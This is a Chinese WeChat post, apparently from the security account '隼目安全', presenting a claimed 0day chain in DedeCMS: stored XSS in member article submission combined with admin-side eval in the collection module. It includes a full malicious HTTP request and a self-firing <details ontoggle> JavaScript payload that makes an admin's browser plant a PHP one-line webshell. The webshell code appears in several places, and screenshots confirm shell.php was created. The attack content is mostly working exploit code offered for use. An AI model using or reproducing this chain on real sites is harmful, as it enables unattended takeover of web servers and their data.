#  【漏洞情报】【0day】织梦DedeCMS 0click劫持导致的前台rce getshell  
原创 隼目安全
                        隼目安全  隼目安全   2026-01-26 01:21  
  
> ❝  
> 由于传播、利用本公众号"隼目安全"所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责,公众号"隼目安全"及作者不为此承担任何责任,一旦造成后果请自行承担!如有侵权烦请告知,我们会立即删除并致歉谢谢！  
  
### 漏洞点1 前台xss  
  
**2. 1.1. 入口点**  
  
**功能模块**  
: 会员中心 - 内容发布功能  
  
**具体文件**  
: member/article_add.php  
  
**触发条件**  
: 普通认证用户向该页面提交 dopost=save  
 的 POST 请求，发布新文章。  
  
**产生原因**  
：POST发送的请求过滤不完整，大部分转义只存在前端，使用POST发包即可绕过  
  
**1.2. 漏洞点**  
  
**核心文件**  
: include/helpers/filter.helper.php  
  
**漏洞函数**  
: HtmlReplace($str, $rptype = -1)  
  
**代码位置**  
: include/helpers/filter.helper.php  
 第 23-51 行（行号可能略有差异）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWP9jbZIuIMKL5voA7PhPdP1k6QThsLHKr4eFZ1oTdybevSbIm5icwdBg/640?wx_fmt=png&from=appmsg "")  
```
functionHtmlReplace($str, $rptype =-1)  {  $str = stripslashes($str);  if($rptype ==-1){  // 完全禁止 script,iframe,link,meta,style,object 等  $str = preg_replace("/&lt;(script|style|link|meta|iframe|frame)(\[^&gt;\]+)?>/isU","", $str);  $str = preg_replace("/&lt;\\/(script|style|link|meta|iframe|frame)&gt;/isU","", $str);  $str = preg_replace("/&lt;\[a-z\]+:\[a-z\]+(\[^&gt;\]+)?>/isU","", $str);// 禁止如 o:p 这样的标签  $str = preg_replace("/&lt;(\[a-z\]+) on\[a-z\]+=(\[^&gt;\]+)?>/isU","&lt;\\\\1&gt;", $str);// 禁止 on\* 事件  }  // ... 其他 rptype 的处理  return addslashes($str);  }  
```  
  
**1.3. 调用链**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOW71icxicib5WbtIvFyic3bWFZSCu2NN8GTQKNic1JoIgiayxwHQQuSN5eHVIA/640?wx_fmt=png&from=appmsg "")  
  
1. **用户操作**  
: 普通用户登录后，访问 member/article_add.php  
页面，填写标题和内容（包含 XSS Payload），点击“提交”。  
  
2. **请求提交**  
: 浏览器向 member/article_add.php  
 发送 POST 请求，dopost  
 参数为 save  
。  
  
3. **包含检查文件**  
: member/article_add.php  
 在处理保存逻辑时，会包含 member/inc/archives_check.php  
 文件。  
  
4. **调用过滤函数**  
: 在 member/inc/archives_check.php  
 中，从 POST 请求获取的文章正文 $body  
 会被传递给漏洞函数进行处理：  
  
  
body,   
此处  
htmltype 默认为 -1  
  
6. **数据入库**  
: 经过过滤（但实际上未成功过滤恶意代码）的 $body  
 内容被拼接到 SQL 语句中，并存入数据库的 dede_addonarticle  
 表。  
  
7. **漏洞触发**  
: 当任意用户（包括管理员）通过 plus/view.php?aid={文章ID}  
 访问这篇文章时，应用程序从数据库中读取含有恶意代码的内容，并直接在页面上渲染。  
  
8. **脚本执行**  
: 浏览器解析到恶意 HTML 标签（如 <img src=x onerror=alert(...)>  
），执行 onerror  
 事件中的 JavaScript 代码，XSS 攻击成功。  
  
**2. 漏洞成因分析**  
  
**2.1. 绕过的安全措施**  
  
本次攻击成功绕过了 HtmlReplace()  
 函数的安全过滤机制。该函数本意是作为防止 XSS 攻击的核心防御措施之一。  
  
**2.2. 安全措施的问题**  
  
HtmlReplace()  
 函数的根本问题在于其**设计缺陷**  
：  
  
1. **不完善的黑名单**  
:  
  
undefined  
 函数仅过滤了少数已知的危险标签，如 <script>  
, <iframe>  
等。但 HTML 中存在大量可以执行脚本的标签，例如 <img>  
, <svg>  
, <details>  
, <video>  
 等，这些标签均未在黑名单中。  
  
2. **事件处理器过滤可被绕过**  
:  
  
undefined 虽然代码中存在一行 preg_replace("/<(\[a-z\]+) on\[a-z\]+=(\[^>\]+)?>/isU", "<\\\\1>", $str);  
 意图移除 on\*  
 事件，但这个正则表达式写得非常脆弱。  
  
undefined **问题所在**  
:  
  
undefined 它只匹配了 on  
 后面紧跟小写字母的情况 (on\[a-z\]+=  
)。  
  
undefined 它没有考虑 HTML 对属性和标签名大小写不敏感的特性。  
  
undefined 它没有处理事件名前后可能存在的空格、制表符、换行符等空白字符。  
  
undefined 例如，onload  
 可以被绕过，而 <svg/onload=...>  
 这种更简洁的向量也完全无法匹配。  
  
**2.3. 触发漏洞的原因**  
  
漏洞之所以被触发，是因为应用程序**过度信任**  
了 HtmlReplace()  
 函数的过滤能力。开发者认为经过此函数处理后的内容是“安全的”，因此直接将其存入数据库并在前端输出。然而，由于该函数的过滤逻辑可以被轻易绕过，导致恶意构造的 JavaScript Payload 被完整地存储和再现，最终在用户浏览器中执行。  
### 漏洞点2 后台rce  
  
**1. 漏洞位置**  
  
**主要漏洞点**  
: include/dedecollection.class.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOW3EbGy1Ma1bwcs75JDP613pavljs8PQ0loA3b6ibXM9icV2ygl9Awibu2w/640?wx_fmt=png&from=appmsg "")  
  
**2. 完整调用链分析**  
  
**2.1 入口点分析**  
  
**入口文件**  
: dede/co_add.php  
  
**权限检查**  
: CheckPurview('co_AddNote');  
 - 需要采集添加权限  
  
**用户类型**  
: 管理员用户  
  
**2.2 调用链路径**  
  
攻击链（逻辑流）  
  
1. 入口  
  
dede/co_add.php 第12行  
  
└─ require_once(dirname(_FILE  
_)."/config.php");  
  
└─ CheckPurview('co_AddNote'); // 权限校验  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWiapBp8CwlLHnGtEMxeHCWYHQvdF2o2thxhYAxhhVAbic0cSmWH6r4plQ/640?wx_fmt=png&from=appmsg "")  
  
2. 接收用户输入  
  
co_add.php step=5  
  
└─ 拼接字符串 $itemconfig，其中直接包含用户提交的 function_ 字段内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWCUIwDN4rNud2FpugmoGicwibAyIp1Q6mq8Aib3RvNzNHB7m7Z03I0rGzQ/640?wx_fmt=png&from=appmsg "")  
  
3. 引入类文件  
  
co_add.php  
  
└─ require_once(DEDEINC.'/dedecollection.class.php');  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWLZEic6QeEmqEsoC7n4pyolwQhV8VoonULpbHHNSLlzfsY9VdqxzgSGw/640?wx_fmt=png&from=appmsg "")  
  
4. 解析配置  
  
dedecollection.class.php LoadItemConfig()  
  
└─ 从 $itemconfig 中提取 function 字段，保存为后续要用到的 PHP 代码片段  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOW4CDKibS36rdBf2WRK6ibae3YFciao7jkC4OEEwaUTwyeogFsibxHFWpJlQ/640?wx_fmt=png&from=appmsg "")  
  
5. 触发执行点  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWkok46BRgDicucfnELd0B782H1EKfekyhvLQic9QOZ9CS5y9PlHOET8ibA/640?wx_fmt=png&from=appmsg "")  
  
dedecollection.class.php GetPageFields()  
  
└─ 检测到“带函数”项目，调用 RunPHP()  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWpfv6m7DjWDtJxXiaj05ZnQ0NpCNBXYkbnuxQA1jlaFeIQsnrdO5m7Wg/640?wx_fmt=png&from=appmsg "")  
  
6. 代码执行  
  
dedecollection.class.php RunPHP()  
  
eval(  
  
phpcode 即为用户输入，无过滤，导致任意 PHP 代码执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWURSlvwaW34uStSEGN990n9oqka9t3hYBNgjp7nQOsOdIwjUzOKU3yw/640?wx_fmt=png&from=appmsg "")  
  
**2.3 关键代码段**  
  
**co_add.php - 构造恶意配置**  
:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWkMQgL0m0icPqicvxiczVhq02ylRTk82icfR8cTPhvZ6qsrTZekN0U1rWibQ/640?wx_fmt=png&from=appmsg "")  
  
**dedecollection.class.php 第 708-801 行 - 触发执行**  
:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOW3OVg8m52v0X8pxwLwjT1mqZwOkULcbrylHicicjd5X60sqbgFdusiaMiaw/640?wx_fmt=png&from=appmsg "")  
  
1. 打开采集节点管理  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWvzb2NiautLRaaq5w8EicmUliaKWxeicJW8CvhiafibG6DDn5Qz3v4ibQLZgmg/640?wx_fmt=png&from=appmsg "")  
  
2. 点击增加新节点，内容模型选择普通文章即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWDoCat9iblgibVU4tQKrSLn9pkfB3KEwRCxKS2nveH43jTlEEBXCJCyeg/640?wx_fmt=png&from=appmsg "")  
  
3. 修改配置，这个界面其实什么都不用填写，不过编码记得改成uft8，不然可能会报错  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOW5Pd1QWshj0ewqnicljqsXBWhIpJbKr1DvQ27D1mbr3rMGibPDHW2y5zw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWAC6Vy3MyNJOF9ImuElPQaJ78JH85qaicN67iaHL5yxXY8ibp0uibKO4uxQ/640?wx_fmt=png&from=appmsg "")  
  
4. 继续点击保存信息进入下一步，进入新界面后  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWvMuyic1XfCFSWIibgVfoEpYHHqcAN0PNCPoP0qqGJcBPc1cibk1IJUprg/640?wx_fmt=png&from=appmsg "")  
  
记得配置一个预览网址，随便填写什么都可以，返回404也没问题，主要是为了下一步操作  
  
5. 最关键的来了，直接填写php代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWBKdunicmm0GNZkkcqbnCibyj75B7Tm1UPOMasGLecwYuTog6voSev6fw/640?wx_fmt=png&from=appmsg "")  
```
$file = '../shell.php';  $code = '<?php @eval($\_POST\["cmd"\]); ?>';  if (!is_writable('.')) {  exit('!w');  }  if (file_put_contents($file, $code) === false) {  exit('!f');  }  <br/>echo "OK:$file";  ?>  
```  
  
其实写什么都行，这里为了方便，我写的是  
  
点击保存配置并预览  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOW1oP5KzWx2COIZ6FQGpU7ASKRXVHGjRR1XyHt0ofeghph5hp22wXP2Q/640?wx_fmt=png&from=appmsg "")  
  
提示webshell已写入  
  
访问测试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWa023KUDdGic2XH0v9Rjj0rdfEiayVX22bkFibHon5IVia1dDn86Sglfbaw/640?wx_fmt=png&from=appmsg "")  
### xss+后台rce组合拳0click劫持 导致的前台rce getshell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWnaxGJlME3GoMPKsXSC5JWzzG7MjkVysibJR91ghz7IZKgepgEwyaHrg/640?wx_fmt=png&from=appmsg "")  
  
首先需要论坛管理员开启允许用户注册(一般的大多论坛都会有这个功能)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWrvHErdH6SfZjTUj2vkjVpHstGUZlauJgVjIHC9VQNSzDbbvQD24qpg/640?wx_fmt=png&from=appmsg "")  
  
随便注册一个用户  
  
发布文章，这里随便填入内容，一会儿用burp抓包修改，应该这里填入的内容会在前端转义，所以一定要抓包修改，不能在此处直接粘贴payload  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWF5yUHytnABj553XIn11YqyzGEcHNYhVEWOzNLlKaZPnGzNnVDtIhDg/640?wx_fmt=png&from=appmsg "")  
  
通过xss与后台rce连用导致前端rce，payload分析在文章末尾  
  
发表文章的位置插入xss的payload  
  
Paylaod：  
```
POST /member/article_add.php HTTP/1.1  Upgrade-Insecure-Requests: 1  Cookie: PHPSESSID=nh39psg5v2o5cf9c8pomj1e1ql; last_vtime=1759853737; last_vtime1BH21ANI1AGD297L1FF21LN02BGE1DNG=2ab33eb76a0cfee4; last_vid=zhangsan; last_vid1BH21ANI1AGD297L1FF21LN02BGE1DNG=379eea6708338568; DedeUserID=2; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=e8d5d4f01a2244cf; DedeLoginTime=1759914279; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=308b8ec7c3b94d13; ENV_GOBACK_URL=%2Fmember%2Fcontent_list.php%3Fchannelid%3D1  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7  Accept-Language: zh-CN,zh;q=0.9  Referer: http://127.0.0.1/member/article_add.php  Sec-Fetch-Dest: document  Connection: keep-alive  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0  Sec-Fetch-User: ?1  Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySyrTdpWXNBErACAu  Origin: http://127.0.0.1  Sec-Fetch-Mode: navigate  Sec-Fetch-Site: same-origin  Cache-Control: max-age=0  Host: 127.0.0.1  Content-Length: 1395  \------WebKitFormBoundarySyrTdpWXNBErACAu  Content-Disposition: form-data; name="dopost"save  \------WebKitFormBoundarySyrTdpWXNBErACAu  Content-Disposition: form-data; name="channelid"1  \------WebKitFormBoundarySyrTdpWXNBErACAu  Content-Disposition: form-data; name="title"kkk  \------WebKitFormBoundarySyrTdpWXNBErACAu  Content-Disposition: form-data; name="tags"\------WebKitFormBoundarySyrTdpWXNBErACAu  Content-Disposition: form-data; name="writer"zhangsan  \------WebKitFormBoundarySyrTdpWXNBErACAu  Content-Disposition: form-data; name="typeid"1  \------WebKitFormBoundarySyrTdpWXNBErACAu  Content-Disposition: form-data; name="mtypesid"0  \------WebKitFormBoundarySyrTdpWXNBErACAu  Content-Disposition: form-data; name="description"\------WebKitFormBoundarySyrTdpWXNBErACAu  Content-Disposition: form-data; name="litpic"; filename=""Content-Type: application/octet-stream  \------WebKitFormBoundarySyrTdpWXNBErACAu  Content-Disposition: form-data; name="dede_addonfields"\------WebKitFormBoundarySyrTdpWXNBErACAu  Content-Disposition: form-data; name="dede_fieldshash"7c4b61b91b4a839699243bbbaca861c5  \------WebKitFormBoundarySyrTdpWXNBErACAu  Content-Disposition: form-data; name="body"<br/>\------WebKitFormBoundarySyrTdpWXNBErACAu  Content-Disposition: form-data; name="vdcode"MQK5  \------WebKitFormBoundarySyrTdpWXNBErACAu--  
```  
  
创建一篇文章，管理员在后台点开待审核文章时自动触发  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWggyhPtsR6ZvNTcQJuRhYJNbEL33OPDloecFqrCfaLXnRDlC0KV8uMw/640?wx_fmt=png&from=appmsg "")  
  
其中kkk是我刚发送数据包发布的新文章  
  
管理员打开显示  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWzG3GdzgyZibU7vCgx462zAD6zz2SbTYRjcmfSApwpZb6SNDnaiaSnbKg/640?wx_fmt=png&from=appmsg "")  
  
这个22是什么等会再讲  
  
查看目录发现shell.php创建成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWTiavpn2aJog0L8eIHia59EqCicfYdZkXvN86Uvzriahmwr31IrZibNGFjgQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWqPIgfTRdibPxfMUpKa7hzugVq6WJicfuQ87T7iaBzOs0VqqYdJNiascCug/640?wx_fmt=png&from=appmsg "")  
  
现在我们来分析这个payload  
```
<details open ontoggle="fetch('/dede/co_add.php',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'channelid=1&step=2&dopost=preview&notename=short'}).then(r=>r.text()).then(t=>{console.log(t);let m=t.match(/name='nid' value='(.*?)'/);if(m){let nid=m[1];alert(nid);fetch('/dede/co_add.php',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'nid='+nid+'&channelid=1&step=5&previewurl=http%3A%2F%2F127.0.0.1%2Ftest.html&sppage=&sptype=full&srul=1&erul=5&keywordtrim=&descriptiontrim=&fields[]=title&match_title=%3Ctitle%3E%5B%E5%86%85%E5%AE%B9%5D%3C%2Ftitle%3E&trim_title=&fields[]=writer&match_writer=&trim_writer=&fields[]=source&match_source=&trim_source=&fields[]=pubdate&match_pubdate=&trim_pubdate=&function_pubdate=%40me%3DGetMkTime%28%40me%29%3B&fields[]=body&value_body=&match_body=&isunit_body=1&isdown_body=1&trim_body=&function_body=%24file%20%3D%20%27..%2Fshell.php%27%3B%0D%0A%24code%20%3D%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%22cmd%22%5D%29%3B%20%3F%3E%27%3B%0D%0Aif%20%28%21is_writable%28%27.%27%29%29%20%7B%0D%0A%09exit%28%27%21w%27%29%3B%0D%0A%7D%0D%0Aif%20%28file_put_contents%28%24file%2C%20%24code%29%20%3D%3D%3D%20false%29%20%7B%0D%0A%09exit%28%27%21f%27%29%3B%0D%0A%7D%0D%0Aecho%20%27OK%3A%27%20.%20%24file%3B%0D%0A%3F%3E&b12=%E4%BF%9D%E5%AD%98%E9%85%8D%E7%BD%AE%E5%B9%B6%E9%A2%84%E8%A7%88'}).then(r=>r.text()).then(res=>console.log(res))}})" hidden><summary></summary></details>
```  
  
**1. 触发方式**  
1. <details open ontoggle="...">  
  
利用 HTML5 的 <details> 标签的 ontoggle 事件，**页面一打开就自动执行 JS**  
。  
  
无需用户交互，**隐蔽性强**  
。  
  
**2. 第一步：获取 nid**  
```
fetch('/dede/co_add.php', {  method: 'POST',  credentials: 'include',  headers: {'Content-Type': 'application/x-www-form-urlencoded'},  body: 'channelid=1&step=2&dopost=preview&notename=short'  })  
```  
  
模拟后台请求，**创建一个新的采集节点**  
。  
  
返回内容中包含一个隐藏的 nid（节点ID），用于后续步骤。  
  
**3. 第二步：注入恶意代码**  
```
fetch('/dede/co_add.php', {  method: 'POST',  crdentials: 'include',  headers: {'Content-Type': 'application/x-www-form-urlencoded'},  body: 'nid=' + nid + '&...&function_body=...'  })  
```  
  
利用 function_body  
 参数，**注入 PHP 代码**  
。  
  
这段 PHP 代码的作用是：  
```
$file = '../shell.php';  $code = '&lt;?php @eval($\_POST\["cmd"\]); ?&gt;';  if (!is_writable('.')) exit('!w');  if (file_put_contents($file, $code) === false) exit('!f');  echo 'OK:' . $file;  
```  
  
在上一级目录写入 shell.php  
。  
  
内容是一个**一句话木马**  
，接受 POST 参数 cmd，直接执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWW2Fuic7qv1lFKicemeSTYictycfSvYkGJTOGtfkhGWzAv2iczQYibSe4Cew/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWhn4RibWvtEhM4nRZd2flDWicfdLic6FHYdFia9ZzvbpdISkxaFdeV9RnHw/640?wx_fmt=jpeg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/9HKdHo8BvC2Hy77BWPPVyKpiahhDBbBOWWzToiaEbQjSntuRzKg9PSgncx2RMudddxrPCpsj3ickvCibianIJwedIlg/640?wx_fmt=gif "")  
  
  
往期推荐  
  
  
  
[【转载】复盘2025：在WAF的缝隙里开出花来（附EDU通杀0DayPOC）](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491127&idx=1&sn=6e297c23bf014488296c0418d96a2597&scene=21#wechat_redirect)  
  
  
[【相关分享】PHP反序列化的万字简单总结](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491088&idx=1&sn=61317dd03dca9a48967b9a44c6413813&scene=21#wechat_redirect)  
  
  
[快手牛逼](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247490390&idx=1&sn=5599b8baf91ff693e5c05974ee6f9594&scene=21#wechat_redirect)  
  
  
[国家公祭日](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247490389&idx=1&sn=5aa496d86d63fd08390fcec8ff0143b1&scene=21#wechat_redirect)  
  
  
[难绷](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247490385&idx=1&sn=d0788e23a020ef5f282a440a74a37b9f&scene=21#wechat_redirect)  
  
  
  
文稿 |   
Ph@nt0m  
  
制作 | Xuan8a1  
  
审发 | 隼目安全  
  
